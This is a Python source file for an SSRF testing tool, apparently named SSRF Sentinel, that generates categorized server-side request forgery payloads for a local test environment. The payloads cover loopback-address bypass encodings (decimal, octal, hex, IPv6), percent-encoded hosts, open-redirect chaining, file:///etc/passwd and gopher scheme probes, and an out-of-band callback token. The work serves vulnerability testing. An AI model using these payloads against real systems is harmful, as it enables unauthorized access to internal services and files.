import uuid
from typing import List, Dict, Any
from config import (
    TARGET_URL,
    INTERNAL_SERVICE_URL,
    CALLBACK_RECEIVER_URL,
    INTERNAL_TEST_PATH,
    INTERNAL_STATUS_PATH,
    INTERNAL_ADMIN_PATH,
    VERIFICATION_MARKER,
    INBAND_MARKER,
    LIMITED_HEADER_MARKER,
    TIME_FAST_MARKER,
    TIME_DELAYED_MARKER,
    BOOLEAN_TRUE_MARKER,
    REDIRECT_MARKER
)


class PayloadGenerator:
    """
    Modular, categorized SSRF payload generation engine for SSRF Sentinel.
    Generates structured test inputs across Categories A through I, strictly
    restricted to the authorized local testing environment.
    """

    def __init__(self):
        self.internal_url = INTERNAL_SERVICE_URL.rstrip("/")
        self.callback_url = CALLBACK_RECEIVER_URL.rstrip("/")
        self.public_url = TARGET_URL.rstrip("/")

    # -------------------------------------------------------------
    # Category A: Standard Internal URL Test Cases
    # -------------------------------------------------------------
    def generate_category_a(self) -> List[Dict[str, Any]]:
        """Standard canonical internal HTTP service endpoints."""
        return [
            {
                "id": "PL-INBAND-001",
                "category": "Category A: Standard Internal URLs",
                "category_code": "CAT_A",
                "technique": "In-Band / Content-Based",
                "name": "Internal Secret Access",
                "payload": f"{self.internal_url}{INTERNAL_TEST_PATH}",
                "expected": {
                    "marker": VERIFICATION_MARKER,
                    "status_code": 200,
                    "fields": ["resource", "verification_marker"]
                },
                "vulnerable_expected_status": 200,
                "secure_expected_status": 403,
                "description": "Requests canonical internal secret resource exposing restricted access marker."
            },
            {
                "id": "PL-INBAND-002",
                "category": "Category A: Standard Internal URLs",
                "category_code": "CAT_A",
                "technique": "In-Band / Content-Based",
                "name": "Internal Admin Core Config",
                "payload": f"{self.internal_url}{INTERNAL_ADMIN_PATH}",
                "expected": {
                    "marker": INBAND_MARKER,
                    "status_code": 200,
                    "fields": ["admin_session_key", "database_uri"]
                },
                "vulnerable_expected_status": 200,
                "secure_expected_status": 403,
                "description": "Requests internal administrative configuration with database and session keys."
            },
            {
                "id": "PL-INBAND-003",
                "category": "Category A: Standard Internal URLs",
                "category_code": "CAT_A",
                "technique": "In-Band / Content-Based",
                "name": "Internal Status Service",
                "payload": f"{self.internal_url}{INTERNAL_STATUS_PATH}",
                "expected": {
                    "marker": "Internal Test Service",
                    "status_code": 200,
                    "fields": ["service", "environment"]
                },
                "vulnerable_expected_status": 200,
                "secure_expected_status": 403,
                "description": "Requests internal heartbeat service verifying internal reachability."
            }
        ]

    # -------------------------------------------------------------
    # Category B: Alternative Local-Address Representations
    # -------------------------------------------------------------
    def generate_category_b(self) -> List[Dict[str, Any]]:
        """Alternative IP representations that resolve to loopback 127.0.0.1."""
        port = "8081"
        return [
            {
                "id": "PL-BYPASS-DEC-001",
                "category": "Category B: Alternative Local Addresses",
                "category_code": "CAT_B",
                "technique": "In-Band / Content-Based",
                "name": "Decimal DWORD IP Representation",
                "payload": f"http://2130706433:{port}{INTERNAL_TEST_PATH}",
                "expected": {
                    "marker": VERIFICATION_MARKER,
                    "notation": "decimal_dword"
                },
                "vulnerable_expected_status": 200,
                "secure_expected_status": 403,
                "description": "Tests decimal integer IP format (2130706433 = 127.0.0.1) to evaluate host parsing bypasses."
            },
            {
                "id": "PL-BYPASS-SHORT-002",
                "category": "Category B: Alternative Local Addresses",
                "category_code": "CAT_B",
                "technique": "In-Band / Content-Based",
                "name": "Shorthand IP Representation",
                "payload": f"http://127.1:{port}{INTERNAL_TEST_PATH}",
                "expected": {
                    "marker": VERIFICATION_MARKER,
                    "notation": "shorthand_ip"
                },
                "vulnerable_expected_status": 200,
                "secure_expected_status": 403,
                "description": "Tests OS socket shorthand address notation (127.1 = 127.0.0.1)."
            },
            {
                "id": "PL-BYPASS-OCT-003",
                "category": "Category B: Alternative Local Addresses",
                "category_code": "CAT_B",
                "technique": "In-Band / Content-Based",
                "name": "Octal IP Representation",
                "payload": f"http://0177.0.0.1:{port}{INTERNAL_TEST_PATH}",
                "expected": {
                    "marker": VERIFICATION_MARKER,
                    "notation": "octal_ip"
                },
                "vulnerable_expected_status": 200,
                "secure_expected_status": 403,
                "description": "Tests octal-encoded first octet notation (0177 = 127)."
            },
            {
                "id": "PL-BYPASS-HEX-004",
                "category": "Category B: Alternative Local Addresses",
                "category_code": "CAT_B",
                "technique": "In-Band / Content-Based",
                "name": "Hexadecimal IP Representation",
                "payload": f"http://0x7f000001:{port}{INTERNAL_TEST_PATH}",
                "expected": {
                    "marker": VERIFICATION_MARKER,
                    "notation": "hex_dword"
                },
                "vulnerable_expected_status": 200,
                "secure_expected_status": 403,
                "description": "Tests hex DWORD representation (0x7f000001 = 127.0.0.1)."
            },
            {
                "id": "PL-BYPASS-IPV6-005",
                "category": "Category B: Alternative Local Addresses",
                "category_code": "CAT_B",
                "technique": "In-Band / Content-Based",
                "name": "IPv6 Loopback Representation",
                "payload": f"http://[::1]:{port}{INTERNAL_TEST_PATH}",
                "expected": {
                    "marker": VERIFICATION_MARKER,
                    "notation": "ipv6_loopback"
                },
                "vulnerable_expected_status": 200,
                "secure_expected_status": 403,
                "description": "Tests IPv6 loopback notation ([::1]) to verify address family filtering."
            }
        ]

    # -------------------------------------------------------------
    # Category C: URL Encoding & Normalization Variations
    # -------------------------------------------------------------
    def generate_category_c(self) -> List[Dict[str, Any]]:
        """URL-encoded and obfuscated authority formats."""
        port = "8081"
        return [
            {
                "id": "PL-ENC-IP-001",
                "category": "Category C: URL Encoding & Normalization",
                "category_code": "CAT_C",
                "technique": "In-Band / Content-Based",
                "name": "URL-Encoded IP Address",
                "payload": f"http://%31%32%37%2e%30%2e%30%2e%31:{port}{INTERNAL_TEST_PATH}",
                "expected": {
                    "marker": VERIFICATION_MARKER
                },
                "vulnerable_expected_status": 200,
                "secure_expected_status": 403,
                "description": "Tests percent-encoded IPv4 octets to evaluate pre-validation URL decoding."
            },
            {
                "id": "PL-ENC-HOST-002",
                "category": "Category C: URL Encoding & Normalization",
                "category_code": "CAT_C",
                "technique": "In-Band / Content-Based",
                "name": "URL-Encoded Localhost Authority",
                "payload": f"http://%6c%6f%63%61%6c%68%6f%73%74:{port}{INTERNAL_TEST_PATH}",
                "expected": {
                    "marker": VERIFICATION_MARKER
                },
                "vulnerable_expected_status": 200,
                "secure_expected_status": 403,
                "description": "Tests percent-encoded 'localhost' string against allowlist filters."
            }
        ]

    # -------------------------------------------------------------
    # Category D: Redirect-Based Test Inputs
    # -------------------------------------------------------------
    def generate_category_d(self) -> List[Dict[str, Any]]:
        """Redirect chaining probes targeting internal endpoints."""
        return [
            {
                "id": "PL-REDIR-INT-001",
                "category": "Category D: Redirect-Based Inputs",
                "category_code": "CAT_D",
                "technique": "In-Band / Content-Based",
                "name": "Internal HTTP 302 Redirect to Secret",
                "payload": f"{self.internal_url}/internal/redirect?to={INTERNAL_TEST_PATH}",
                "expected": {
                    "marker": VERIFICATION_MARKER,
                    "follows_redirect": True
                },
                "vulnerable_expected_status": 200,
                "secure_expected_status": 403,
                "description": "Requests an internal endpoint that returns HTTP 302 redirecting to /internal/secret."
            },
            {
                "id": "PL-REDIR-PUB-002",
                "category": "Category D: Redirect-Based Inputs",
                "category_code": "CAT_D",
                "technique": "In-Band / Content-Based",
                "name": "Public Application Open Redirect Bounce",
                "payload": f"{self.public_url}/redirect?to={self.internal_url}{INTERNAL_TEST_PATH}",
                "expected": {
                    "marker": VERIFICATION_MARKER,
                    "follows_redirect": True
                },
                "vulnerable_expected_status": 200,
                "secure_expected_status": 403,
                "description": "Bounces through public open redirect on port 8080 targeting internal port 8081."
            },
            {
                "id": "PL-REDIR-LOOP-003",
                "category": "Category D: Redirect-Based Inputs",
                "category_code": "CAT_D",
                "technique": "Input Validation",
                "name": "Infinite Redirect Loop Handling",
                "payload": f"{self.internal_url}/internal/redirect-loop",
                "expected": {
                    "loop_prevented": True,
                    "expected_status": 508
                },
                "vulnerable_expected_status": 508,
                "secure_expected_status": 403,
                "description": "Tests whether redirect engine caps recursion depth without hanging."
            }
        ]

    # -------------------------------------------------------------
    # Category E: Malformed URL and Unsupported Scheme Inputs
    # -------------------------------------------------------------
    def generate_category_e(self) -> List[Dict[str, Any]]:
        """Negative control probes testing scheme and authority validation."""
        return [
            {
                "id": "PL-SCHEME-FILE-001",
                "category": "Category E: Unsupported Schemes & Malformed URLs",
                "category_code": "CAT_E",
                "technique": "Input Validation",
                "name": "File Scheme Rejection Probe",
                "payload": "file:///etc/passwd",
                "expected": {
                    "blocked": True,
                    "status_code": 400
                },
                "vulnerable_expected_status": 400,
                "secure_expected_status": 400,
                "description": "Tests rejection of local file:// schema."
            },
            {
                "id": "PL-SCHEME-GOPHER-002",
                "category": "Category E: Unsupported Schemes & Malformed URLs",
                "category_code": "CAT_E",
                "technique": "Input Validation",
                "name": "Gopher Scheme Rejection Probe",
                "payload": "gopher://127.0.0.1:8081/_test",
                "expected": {
                    "blocked": True,
                    "status_code": 400
                },
                "vulnerable_expected_status": 400,
                "secure_expected_status": 400,
                "description": "Tests rejection of gopher:// protocol smuggling schema."
            },
            {
                "id": "PL-SCHEME-FTP-003",
                "category": "Category E: Unsupported Schemes & Malformed URLs",
                "category_code": "CAT_E",
                "technique": "Input Validation",
                "name": "FTP Scheme Rejection Probe",
                "payload": "ftp://127.0.0.1:8081/",
                "expected": {
                    "blocked": True,
                    "status_code": 400
                },
                "vulnerable_expected_status": 400,
                "secure_expected_status": 400,
                "description": "Tests rejection of ftp:// schema."
            },
            {
                "id": "PL-MALFORMED-004",
                "category": "Category E: Unsupported Schemes & Malformed URLs",
                "category_code": "CAT_E",
                "technique": "Input Validation",
                "name": "Malformed Authority Probe",
                "payload": "http://:8081/internal/secret",
                "expected": {
                    "blocked": True,
                    "status_code": 400
                },
                "vulnerable_expected_status": 400,
                "secure_expected_status": 400,
                "description": "Tests URL parser robustness against missing host authority."
            }
        ]

    # -------------------------------------------------------------
    # Category F: Limited-Response Test Inputs
    # -------------------------------------------------------------
    def generate_category_f(self) -> List[Dict[str, Any]]:
        """Limited response scenarios (status-only, headers-only, truncated, generic, suppressed)."""
        return [
            {
                "id": "PL-LIM-STATUS-001",
                "category": "Category F: Limited-Response Test Inputs",
                "category_code": "CAT_F",
                "technique": "Limited-Response",
                "name": "Status-Only HTTP 204 Probe",
                "payload": f"{self.internal_url}/internal/limited/status-only",
                "expected": {
                    "status_code": 204,
                    "body_empty": True
                },
                "vulnerable_expected_status": 204,
                "secure_expected_status": 403,
                "description": "Probe expecting HTTP 204 No Content with suppressed body."
            },
            {
                "id": "PL-LIM-HEADER-002",
                "category": "Category F: Limited-Response Test Inputs",
                "category_code": "CAT_F",
                "technique": "Limited-Response",
                "name": "Header-Only Marker Leak Probe",
                "payload": f"{self.internal_url}/internal/limited/header-only",
                "expected": {
                    "header_marker": LIMITED_HEADER_MARKER,
                    "expected_header": "X-Internal-Marker"
                },
                "vulnerable_expected_status": 200,
                "secure_expected_status": 403,
                "description": "Probe evaluating leaked metadata headers while response body is suppressed."
            },
            {
                "id": "PL-LIM-TRUNC-003",
                "category": "Category F: Limited-Response Test Inputs",
                "category_code": "CAT_F",
                "technique": "Limited-Response",
                "name": "Truncated Response Buffer Probe",
                "payload": f"{self.internal_url}/internal/limited/truncated",
                "expected": {
                    "prefix": "SSRF_SECRET_SEGMENT_PARTIAL_DATA",
                    "is_truncated": True
                },
                "vulnerable_expected_status": 200,
                "secure_expected_status": 403,
                "description": "Probe returning partial or truncated memory/string buffer fragments."
            },
            {
                "id": "PL-LIM-GEN-004",
                "category": "Category F: Limited-Response Test Inputs",
                "category_code": "CAT_F",
                "technique": "Limited-Response",
                "name": "Generic Success Message Probe",
                "payload": f"{self.internal_url}/internal/limited/generic",
                "expected": {
                    "message": "Internal request processed successfully"
                },
                "vulnerable_expected_status": 200,
                "secure_expected_status": 403,
                "description": "Generic acknowledgement confirming internal execution without leaking sensitive data."
            },
            {
                "id": "PL-LIM-SUPP-005",
                "category": "Category F: Limited-Response Test Inputs",
                "category_code": "CAT_F",
                "technique": "Limited-Response",
                "name": "Content-Filter Suppressed Body Probe",
                "payload": f"{self.internal_url}/internal/limited/suppressed",
                "expected": {
                    "suppression_token": "[CONTENT_SUPPRESSED_BY_POLICY]"
                },
                "vulnerable_expected_status": 200,
                "secure_expected_status": 403,
                "description": "Sanitized response indicating policy filtering intercepted internal data."
            }
        ]

    # -------------------------------------------------------------
    # Category G: Time-Based Test Inputs
    # -------------------------------------------------------------
    def generate_category_g(self) -> Dict[str, Dict[str, Any]]:
        """Time-based differential testing probes."""
        return {
            "fast": {
                "id": "PL-TIME-FAST-001",
                "category": "Category G: Time-Based Test Inputs",
                "category_code": "CAT_G",
                "technique": "Time-Based",
                "name": "Immediate Execution Baseline Probe",
                "payload": f"{self.internal_url}/internal/fast",
                "expected": {
                    "delay_ms": 0,
                    "marker": TIME_FAST_MARKER
                },
                "vulnerable_expected_status": 200,
                "secure_expected_status": 403,
                "description": "Zero-delay endpoint for calibrating network latency."
            },
            "delayed": {
                "id": "PL-TIME-DELAY-002",
                "category": "Category G: Time-Based Test Inputs",
                "category_code": "CAT_G",
                "technique": "Time-Based",
                "name": "Bounded Delayed Execution Probe",
                "payload": f"{self.internal_url}/internal/delayed?ms=2000",
                "expected": {
                    "delay_ms": 2000,
                    "marker": TIME_DELAYED_MARKER
                },
                "vulnerable_expected_status": 200,
                "secure_expected_status": 403,
                "description": "Controlled 2.0s delayed endpoint to measure round-trip differential latency."
            }
        }

    # -------------------------------------------------------------
    # Category H: Boolean-Based Test Inputs
    # -------------------------------------------------------------
    def generate_category_h(self) -> Dict[str, Dict[str, Any]]:
        """Boolean differential testing condition pairs."""
        return {
            "true_probe": {
                "id": "PL-BOOL-TRUE-001",
                "category": "Category H: Boolean-Based Test Inputs",
                "category_code": "CAT_H",
                "technique": "Boolean-Based",
                "name": "Boolean Condition TRUE Probe",
                "payload": f"{self.internal_url}/internal/check?condition=true",
                "expected": {
                    "status_code": 200,
                    "marker": BOOLEAN_TRUE_MARKER,
                    "eval_header": "TRUE"
                },
                "vulnerable_expected_status": 200,
                "secure_expected_status": 403,
                "description": "Condition TRUE expected to return HTTP 200 with larger padded payload."
            },
            "false_probe": {
                "id": "PL-BOOL-FALSE-002",
                "category": "Category H: Boolean-Based Test Inputs",
                "category_code": "CAT_H",
                "technique": "Boolean-Based",
                "name": "Boolean Condition FALSE Probe",
                "payload": f"{self.internal_url}/internal/check?condition=false",
                "expected": {
                    "status_code": 404,
                    "eval_header": "FALSE"
                },
                "vulnerable_expected_status": 404,
                "secure_expected_status": 403,
                "description": "Condition FALSE expected to return HTTP 404 with smaller response body."
            }
        }

    # -------------------------------------------------------------
    # Category I: Blind/OOB Callback Inputs with Unique Tokens
    # -------------------------------------------------------------
    def generate_category_i(self, token: str = None) -> Dict[str, Any]:
        """Dedicated Out-of-Band callback probe with unique token."""
        if not token:
            token = f"ssrf_tok_{uuid.uuid4().hex[:16]}"
        return {
            "id": "PL-OOB-001",
            "category": "Category I: Blind / OOB Callback Inputs",
            "category_code": "CAT_I",
            "technique": "Blind / Out-of-Band",
            "name": "Dedicated Local OOB Callback Probe",
            "token": token,
            "payload": f"{self.callback_url}/callback?token={token}",
            "expected": {
                "callback_received": True,
                "token_match": token
            },
            "vulnerable_expected_status": 200,
            "secure_expected_status": 200,
            "description": "Server-side request forced to dedicated local OOB callback receiver (port 8090)."
        }

    # Backward compatibility helpers
    def generate_inband_payloads(self):
        return self.generate_category_a()

    def generate_limited_payloads(self):
        return self.generate_category_f()

    def generate_oob_payload(self, token: str = None):
        return self.generate_category_i(token)

    def generate_time_based_payloads(self):
        return self.generate_category_g()

    def generate_boolean_payloads(self):
        return self.generate_category_h()

    def generate_control_payloads(self):
        return self.generate_category_e()
